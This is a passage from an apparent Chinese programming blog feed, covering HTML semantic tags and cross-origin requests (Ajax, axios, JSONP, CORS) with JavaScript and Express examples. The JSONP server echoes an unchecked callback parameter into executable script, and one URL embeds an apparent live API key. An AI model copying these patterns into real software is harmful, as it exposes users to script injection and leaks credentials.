&lt;/p&gt;</code>来为标签自检增加额外的空白段落，这里应该使用<code>CSS</code>的<code>margin/padding</code>来实现；</p></li><li><p><code>ul</code>：一些开发者往<code>&lt;ul&gt;</code>中添加<strong>文本</strong>来达到文本缩进的目的，这种做法即不符合语义化要求，同样也是非法的<code>HTML</code>实践。<code>&lt;ul&gt;</code>标签中只能有<code>&lt;li&gt;</code>标签。</p></li><li><p><code>&lt;h1&gt;~&lt;h6&gt;</code>：该标签可以使文本字体变大，变粗，但如果文本<strong>并非是标题</strong>，应该使用<code>CSS font-weight font-size</code>；</p></li><li><p>不要将<code>&lt;b&gt;</code>元素与 <code>&lt;strong&gt;</code>、<code>&lt;em&gt;</code>或<code>&lt;mark&gt;</code>元素混淆。<code>&lt;strong&gt;</code>元素表示某些重要性的文本,<code>&lt;em&gt;</code>强调文本,而<code>&lt;mark&gt;</code>元素表示某些相关性的文本。<code>&lt;b&gt;</code>元素不传达这样的特殊语义信息;仅在没有其他合适的元素时使用它。如果不是出于语义目的而使用 <code>&lt;b&gt;</code> 元素，那么让文本显示粗体更好的方式是使用将 CSS 的 <code>font-weight</code> 属性设置为 <code>&quot;bold&quot;</code>。</p></li></ol><p>总结：上面例子都是为了说明一点，==用正确的标签做正确的事==。</p><h1 id="HTML5新增"><a href="#HTML5新增" class="headerlink" title="HTML5新增"></a>HTML5新增</h1><p>在HTML5出来之前，我们习惯于用<code>div</code>来表示页面的章节或者不同模块，但是<code>div</code>本身是没有语义的。但是现在，HTML5中加入了一些语义化标签，来更清晰的表达文档结构。</p><p><a href="https://imgtu.com/i/byFgUA"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/07/byFgUA.png" alt="byFgUA.png"></a></p><p>W3C制定了这些语义化标签，不可能完全符合我们的设计目标。我们的目标是为了能够<strong>让开发者或是爬虫读懂各个模块的语义化内容</strong>，因此，<code>div</code>作为一个没有任何语义，仅仅是用来构建结构的元素，是<strong>最适合做容器的标签。</strong></p><p><code>&lt;header&gt;</code></p><ul><li><strong>定义文章的介绍信息</strong>：标题，logo，slogan；包裹目录部分，搜索框，一个nav或者任何相关的logo；</li><li>一个页面中<code>&lt;header&gt;</code>的个数没有限制，可以为每个内容块添加一个<code>header</code>；</li></ul><p><code>&lt;nav&gt;</code></p><ul><li><strong>定义文章导航栏，链接等;</strong></li><li><code>nav</code>一般和<code>ul</code>、<code>li</code>（无序列表）配合做导航栏；</li></ul><p><code>&lt;main&gt;</code></p><ul><li><strong>定义文章的主要内容</strong></li><li>main标签在一份文档中是<strong>唯一</strong>的，其后代元素常常包括<code>&lt;article&gt;</code>；</li></ul><p><code>&lt;article&gt;</code></p><ul><li><strong>定义文档中可以脱离其他部分，一份独立的内容，通常带有标题，当article内嵌article时，里外层的内容应该是相关的</strong>，比如一篇微博和它的评论；</li></ul><p><code>&lt;section&gt;</code></p><ul><li>与article的差别在于，<strong>它是整体的一部分，或者是文章的一节，一般来说section也会带有标题；</strong></li></ul><p><code>&lt;aside&gt;</code></p><ul><li><strong>侧边栏（与article并列存在）或者嵌入内容（在article内），通常认为是独立拆分出来而不受整体影响的一部分，作为主要内容的附属信息</strong>，如索引，词条列表，或者页面及站点的附属信息，如广告，作者资料介绍等；</li></ul><p> <code>&lt;footer&gt;</code></p><ul><li><strong>页脚，通常包含作者、版权信息或者相关链接等</strong>；</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTML语义化&quot;&gt;&lt;a href=&quot;#HTML语义化&quot; class=&quot;headerlink&quot; title=&quot;HTML语义化&quot;&gt;&lt;/a&gt;HTML语义化&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;良好的语义化代码可以直接从代码上就能看出来那一块到底是要表达什么内容。&lt;/</summary>
      
    
    
    
    <category term="HTML&amp;CSS" scheme="https://lesliewaong.top/categories/HTML-CSS/"/>
    
    
    <category term="HTML" scheme="https://lesliewaong.top/tags/HTML/"/>
    
    <category term="HTML5" scheme="https://lesliewaong.top/tags/HTML5/"/>
    
    <category term="语义化" scheme="https://lesliewaong.top/tags/%E8%AF%AD%E4%B9%89%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>跨域通信</title>
    <link href="https://lesliewaong.top/posts/58c5541d.html"/>
    <id>https://lesliewaong.top/posts/58c5541d.html</id>
    <published>2022-03-03T11:10:23.000Z</published>
    <updated>2022-03-25T14:08:26.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="跨域通信"><a href="#跨域通信" class="headerlink" title="跨域通信"></a>跨域通信</h1><h2 id="同源策略和跨域"><a href="#同源策略和跨域" class="headerlink" title="同源策略和跨域"></a>同源策略和跨域</h2><p><strong>同源策略</strong>：限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。</p><p>同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到<code>XSS</code>、<code>CSRF</code>等攻击。所谓同源是指”<strong>协议</strong>+<strong>域名</strong>+<strong>端口</strong>“三者相同，<strong>即便两个不同的域名指向同一个ip地址，也非同源</strong>。</p><p><strong>同源策略限制内容有：</strong></p><ul><li><code>Cookie</code>、<code>LocalStorage</code>、<code>IndexedDB</code> 等存储性内容</li><li><code>DOM</code> 节点</li><li><code>AJAX</code> 请求</li></ul><p>但是有的标签是允许跨域加载资源：</p><ul><li><code>&lt;img src=XXX&gt;</code></li><li><code>&lt;link href=XXX&gt;</code></li><li><code>&lt;script src=XXX&gt;</code></li></ul><p><strong>当协议、子域名、主域名、端口号中任意一个不相同时，都算作不同域</strong>。不同域之间相互请求资源，就算作“跨域”。</p><p>特别说明两点：</p><p><strong>第一：如果是协议和端口造成的跨域问题“前台”是无能为力的。</strong></p><p><strong>第二：在跨域问题上，仅仅是通过“URL的首部”来识别而不会根据域名对应的IP地址是否相同来判断。“URL的首部”可以理解为“协议, 域名和端口必须匹配”</strong>。</p><p>这里你或许有个疑问：<strong>请求跨域了，那么请求到底发出去没有？</strong></p><p><strong>跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了</strong>。你可能会疑问明明通过表单的方式可以发起跨域请求，为什么 Ajax 就不会?因为归根结底，跨域是为了阻止用户读取到另一个域名下的内容，Ajax 可以获取响应，浏览器认为这不安全，所以拦截了响应。但是表单并不会获取新的内容，所以可以发起跨域请求。<strong>同时也说明了跨域并不能完全阻止 CSRF，因为请求毕竟是发出去了。</strong></p><h2 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h2><p>Asynchronous Javascript And XML是一种异步请求数据的web开发技术，对于改善用户的体验和页面性能很有帮助。简单地说，在不需要重新刷新页面的情况下，Ajax 通过异步请求加载后台数据，并在网页上呈现出来。</p><h3 id="原生Ajax"><a href="#原生Ajax" class="headerlink" title="原生Ajax"></a>原生Ajax</h3><h4 id="发送-Ajax-请求的五个步骤"><a href="#发送-Ajax-请求的五个步骤" class="headerlink" title="发送 Ajax 请求的五个步骤"></a>发送 Ajax 请求的五个步骤</h4><blockquote><p>XMLHttpRequest（XHR）对象用于与服务器交互。通过 XMLHttpRequest 可以在不刷新页面的情况下请求特定 URL，获取数据。这允许网页在不影响用户操作的情况下，更新页面的局部内容。</p></blockquote><ul><li><p>创建<code>XMLHttpRequest</code> 对象。<code>const xhr = new XMLHttpRequest()</code></p></li><li><p>使用<code>open</code>方法设置请求的参数。<code>xhr.open(method, url, 是否异步)</code>。</p><ul><li><p><code>get</code>可以把请求参数拼接在<code>url</code></p></li><li><p>如果想要使用<code>post</code>提交数据,必须添加此行。</p><p><code>xhr.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);</code></p></li></ul></li><li><p>发送请求。</p><ul><li><code>get</code>请求：<code>xhr.send()</code></li><li><code>post</code>请求：将数据通过<code>send</code>方法传递 <code>xhr.send(&#39;name=fox&amp;age=18&#39;);</code></li></ul></li><li><p>注册事件。 注册<code>onreadystatechange</code>事件，状态改变时就会调用。</p><ul><li><code>xhr.readyState===4</code></li><li><code>(xhr.status&gt;=200 &amp;&amp; xhr.status&lt;300) || xhr.status === 304</code> 304：服务器端资源未改变，可直接使用客户端未过期的缓存。</li></ul></li><li><p>获取返回的数据，更新UI。</p></li></ul><h4 id="onreadystatechange-事件"><a href="#onreadystatechange-事件" class="headerlink" title="onreadystatechange 事件"></a>onreadystatechange 事件</h4><p>注册 <code>onreadystatechange</code> 事件后，每当 <code>readyState</code> 属性改变时，就会调用 <code>onreadystatechange</code> 函数。</p><p><code>readyState</code>：（存有 <code>XMLHttpRequest</code> 的状态。从 0 到 4 发生变化）</p><ul><li><p>0: 请求未初始化</p></li><li><p>1: 服务器连接已建立</p></li><li><p>2: 请求已接收</p></li><li><p>3: 请求处理中</p></li><li><p>4: 请求已完成，且响应已就绪</p></li></ul><h4 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h4><p>IE浏览器通过 <code>XMLHttpRequest</code> 或者 <code>ActiveXObject</code> （IE6及更低版本浏览器）对象同样实现了ajax的功能。</p><h3 id="Promise封装axios"><a href="#Promise封装axios" class="headerlink" title="Promise封装axios"></a>Promise封装axios</h3><p>axios是一个基于<code>promise</code>的<code>HTTP</code>库，可以用在<code>浏览器</code>或者<code>node.js</code>中。</p><p>axios是通过promise实现对ajax技术的一种封装。</p><blockquote><p>axios提供两个http请求适配器，XHR和HTTP。XHR的核心是浏览器端的XMLHttpRequest对象；HTTP的核心是node的http.request方法。</p></blockquote><p><strong>特性</strong>：</p><ul><li>从浏览器中创建XMLHttpRequests</li><li>从node.js创建http请求</li><li>支持promise API</li><li>拦截请求与响应</li><li>转换请求数据与响应数据</li><li>取消请求</li><li>自动转换JSON数据</li><li>客户端支持防御XSRF</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送异步ajax请求的函数模块</span></span><br><span class="line"><span class="comment"> * 封装axios库</span></span><br><span class="line"><span class="comment"> * 函数返回值promise对象</span></span><br><span class="line"><span class="comment"> * 优化1: 统一处理请求异常?</span></span><br><span class="line"><span class="comment"> * 在外层包一个自己创建的promise对象</span></span><br><span class="line"><span class="comment"> * 在请求出错时, 不reject(error), 而是显示错误提示</span></span><br><span class="line"><span class="comment"> * 优化2: 异步得到不是reponse, 而是response.data</span></span><br><span class="line"><span class="comment"> * 在请求成功resolve时: resolve(response.data)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; message &#125; <span class="keyword">from</span> <span class="string">&#x27;antd&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">url,data=&#123;&#125;,type=<span class="string">&#x27;GET&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> promise;</span><br><span class="line">        <span class="comment">// 执行异步ajax请求</span></span><br><span class="line">        <span class="keyword">if</span>(type===<span class="string">&#x27;GET&#x27;</span>)&#123;<span class="comment">//发GET请求</span></span><br><span class="line">            promise=axios.get(url,&#123;</span><br><span class="line">                <span class="attr">params</span>:data</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//发POST请求</span></span><br><span class="line">            promise=axios.post(url,data)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果请求成功了，调用resolve(value)</span></span><br><span class="line">        <span class="comment">// 该方法返回一个以response.data值解析后的Promise对象</span></span><br><span class="line">        promise.then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">            resolve(response.data)</span><br><span class="line">            <span class="comment">// console.log(response.data)</span></span><br><span class="line">        <span class="comment">// 如果请求失败了，不调用reject(reason)，而是提示异常信息   </span></span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            message.error(<span class="string">&#x27;请求出错了：&#x27;</span>+error.message)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跨域解决方案"><a href="#跨域解决方案" class="headerlink" title="跨域解决方案"></a>跨域解决方案</h2><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><h4 id="JSONP原理"><a href="#JSONP原理" class="headerlink" title="JSONP原理"></a>JSONP原理</h4><p><code>JSON with Padding </code> JS函数包裹JSON数据。</p><p><strong>利用 <code>&lt;script&gt;</code> 标签没有跨域限制的漏洞，网页可以得到从其他来源动态产生的 JSON 数据。JSONP请求一定需要对方的服务器做支持才可以。</strong></p><p> <code>&lt;script&gt;</code> 标签中type的默认属性是<code>text/javascript</code>,请求内容就会被浏览器以JS代码进行执行。</p><p><code>JSONP</code>和<code>AJAX</code>相同，都可以从客户端向服务器端发送请求获取数据。但AJAX属于同源策略，JSONP属于非同源策略（跨域请求）。</p><h4 id="JSONP优缺点"><a href="#JSONP优缺点" class="headerlink" title="JSONP优缺点"></a>JSONP优缺点</h4><p>JSONP优点是简单兼容性好，可用于解决主流浏览器的跨域数据访问的问题。</p><p><strong>缺点是仅支持get方法，具有局限性；不安全，可能会遭受XSS攻击。</strong></p><h4 id="JSONP的实现流程"><a href="#JSONP的实现流程" class="headerlink" title="JSONP的实现流程"></a>JSONP的实现流程</h4><ul><li>声明一个回调函数，其函数名(如<code>jsonpCallback</code>)当做参数值，要传递给跨域请求数据的服务器，函数形参为要获取目标数据(服务器返回的data)。</li><li>创建一个<code>&lt;script&gt;</code>标签，把那个跨域的API数据接口地址，赋值给<code>&lt;script&gt;</code>的<code>src</code>，还要在这个地址中向服务器传递该函数名（可以通过问号传参:<code>?callback=jsonpCallback</code>）。</li><li>服务器接收到请求后，需要进行特殊的处理：把传递进来的函数名和它需要给你的数据拼接成一个字符串。</li><li>最后服务器把准备的数据通过HTTP协议返回给客户端，客户端再调用执行之前声明的回调函数（<code>jsonpCallback</code>），对返回的数据进行操作。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//去创建一个script标签</span></span><br><span class="line"><span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line"><span class="comment">//script的src属性设置接口地址 并带一个callback回调函数名称</span></span><br><span class="line">script.src = <span class="string">&quot;http://127.0.0.1:8888/index.php?callback=jsonpCallback&quot;</span>;</span><br><span class="line"><span class="comment">//插入到页面</span></span><br><span class="line"><span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line"><span class="comment">//通过定义函数名去接收后台返回数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonpCallback</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//注意  jsonp返回的数据是json对象可以直接使用</span></span><br><span class="line">    <span class="comment">//ajax  取得数据是json字符串需要转换成json对象才可以使用。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在开发中可能会遇到多个 JSONP 请求的回调函数名是相同的，这时候就需要一个封装好的JSONP函数。</p><p><strong>React调用jsonp的库</strong></p><p><code>yarn add jsonp</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonp <span class="keyword">from</span> <span class="string">&#x27;jsonp&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;message&#125; <span class="keyword">from</span> <span class="string">&#x27;antd&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> reqWeather = <span class="function">(<span class="params">city</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://api.map.baidu.com/telematics/v3/weather?location=<span class="subst">$&#123;city&#125;</span>&amp;output=json&amp;ak=3p49MVra6urFRGOT9s8UBWr2`</span></span><br><span class="line">    <span class="comment">// 发送jsonp请求 这里的callback是箭头函数</span></span><br><span class="line">    jsonp(url, &#123;&#125;, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;jsonp()&#x27;</span>, err, data)</span><br><span class="line">      <span class="comment">// 如果成功了</span></span><br><span class="line">      <span class="keyword">if</span> (!err &amp;&amp; data.status===<span class="string">&#x27;success&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 取出需要的数据</span></span><br><span class="line">        <span class="keyword">const</span> &#123;dayPictureUrl, weather&#125; = data.results[<span class="number">0</span>].weather_data[<span class="number">0</span>]</span><br><span class="line">        resolve(&#123;dayPictureUrl, weather&#125;)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果失败了</span></span><br><span class="line">        message.error(<span class="string">&#x27;获取天气信息失败!&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// reqWeather(&#x27;北京&#x27;)</span></span><br></pre></td></tr></table></figure><h4 id="JSONP请求的简单例子"><a href="#JSONP请求的简单例子" class="headerlink" title="JSONP请求的简单例子"></a>JSONP请求的简单例子</h4><p>客户端 <code>http://127.0.0.1:5500</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取 input和p元素</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&quot;username&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//声明回调函数</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//修改 p 标签的提示文本</span></span></span><br><span class="line"><span class="javascript">            p.innerHTML = data.msg;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(data)</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//绑定事件</span></span></span><br><span class="line"><span class="javascript">        btn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//获取用户的输入值</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> username = input.value;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(username)</span></span><br><span class="line"><span class="javascript">            <span class="comment">//向服务器端发送请求 检测用户名是否存在</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//1. 创建 script 标签</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">//2. 设置标签的 src 属性</span></span></span><br><span class="line"><span class="javascript">            script.src = <span class="string">`http://127.0.0.1:8000/jsonp-server?name=<span class="subst">$&#123;username&#125;</span>&amp;callback=handle`</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//3. 将 script 插入到文档中</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(script);</span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>服务器 <code>http://127.0.0.1:8000</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 引入express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 创建应用对象</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 创建路由规则</span></span><br><span class="line"><span class="comment">// request 是对请求报文的封装</span></span><br><span class="line"><span class="comment">// response 是对响应报文的封装</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//jsonp服务</span></span><br><span class="line"><span class="keyword">const</span> username=[];</span><br><span class="line">app.all(<span class="string">&#x27;/jsonp-server&#x27;</span>,<span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;name,callback&#125; = request.query;</span><br><span class="line">    <span class="keyword">const</span> data = &#123;<span class="attr">msg</span>:<span class="string">&quot;用户名设置成功&quot;</span>&#125;;      </span><br><span class="line">    username.includes(name) ? data.msg=<span class="string">&quot;用户名已存在&quot;</span> : username.push(name);</span><br><span class="line">    <span class="built_in">console</span>.log(username)</span><br><span class="line">    <span class="comment">//将数据转化为字符串</span></span><br><span class="line">    <span class="keyword">let</span> str = <span class="built_in">JSON</span>.stringify(data);</span><br><span class="line">    <span class="comment">//返回结果</span></span><br><span class="line">    response.end(<span class="string">`<span class="subst">$&#123;callback&#125;</span>(<span class="subst">$&#123;str&#125;</span>)`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 监听端口启动服务</span></span><br><span class="line">app.listen(<span class="number">8000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务已经启动, 8000 端口监听中....&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS（Cross-Origin Resource Sharing），跨域资源共享。</p><p>CORS是官方的跨域解决方案，<strong>需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现</strong>。</p><p>通过设置一个<strong>响应头</strong>来告诉浏览器，该请求允许跨域，浏览器收到该响应以后就会对响应放行。</p><p>浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端。只要后端实现了 CORS，就实现了跨域。</p><p>服务端设置 <code>Access-Control-Allow-Origin</code> 就可以开启 CORS。 <strong>该属性表示哪些域名可以访问资源，如果设置通配符<code>*</code>则表示所有网站都可以访问资源。</strong></p><p>虽然设置 CORS 和前端没什么关系，但是通过这种方式解决跨域问题的话，会在发送请求时出现两种情况，分别为<strong>简单请求</strong>和<strong>复杂请求</strong>。</p><h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><p>只要同时满足以下两大条件，就属于简单请求</p><p>请求方法是 <code>HEAD</code>、<code>GET</code>、<code>POST</code> 三种之一；</p><p>HTTP 头信息不超过右边着几个字段：<code>Accept</code>、<code>Accept-Language</code>、<code>Content-Language</code>、<code>Last-Event-ID</code> <code>Content-Type</code> 只限于三个值 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>；</p><h4 id="复杂请求"><a href="#复杂请求" class="headerlink" title="复杂请求"></a>复杂请求</h4><p>不符合以上条件的请求，比如请求方法是 <code>PUT</code> 或 <code>DELETE</code>，或 <code>Content-Type</code> 值为 <code>application/json</code>。浏览器会在正式通信之前，发送一次 HTTP 预检 <code>OPTIONS</code> 请求，先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 请求方法和头信息字段。只有得到肯定答复，浏览器才会发出正式的 <code>XHR</code> 请求，否则报错。</p><h4 id="CORS完整复杂请求的例子"><a href="#CORS完整复杂请求的例子" class="headerlink" title="CORS完整复杂请求的例子"></a>CORS完整复杂请求的例子</h4><p>客户端  <code>http://127.0.0.1:5500</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>发送请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        btn.addEventListener(<span class="string">&#x27;click&#x27;</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> xhr=<span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.cookie=<span class="string">&quot;name=leslie&quot;</span>;<span class="comment">// cookie不能跨域</span></span></span><br><span class="line"><span class="javascript">            xhr.withCredentials=<span class="literal">true</span>;<span class="comment">// 前端设置是否带cookie</span></span></span><br><span class="line"><span class="javascript">            xhr.open(<span 